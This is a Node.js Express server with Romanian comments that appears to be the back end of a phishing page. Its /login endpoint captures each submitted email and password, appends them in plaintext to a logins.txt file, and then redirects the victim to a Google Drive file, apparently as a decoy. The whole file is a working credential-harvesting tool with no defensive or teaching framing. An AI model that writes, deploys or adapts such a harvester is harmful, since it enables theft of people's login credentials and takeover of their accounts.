const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

// Servește fișiere statice din directorul public
app.use(express.static(path.join(__dirname, 'public')));

// Rotează cererile către fișierul index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint pentru salvarea datelor în fișierul logins.txt
app.post('/login', express.urlencoded({ extended: true }), (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        const logEntry = `Username: ${email}, Password: ${password}\n`;
        fs.appendFile('logins.txt', logEntry, (err) => {
            if (err) {
                console.error('Eroare la salvarea datelor:', err);
                res.status(500).send('Eroare la salvarea datelor.');
                return;
            }
            console.log('Datele au fost salvate.');
            // Redirectează utilizatorul către un link după salvarea datelor
            res.redirect('https://drive.google.com/file/d/1-dAcT4gXRaiM0XqDSyWSeq6MBarSKG4l/view?usp=drive_link');
        });
    } else {
        res.status(400).send('Datele sunt incomplete.');
    }
});

// Pornește serverul
app.listen(port, () => {
    console.log(`Serverul rulează pe http://localhost:${port}`);
});
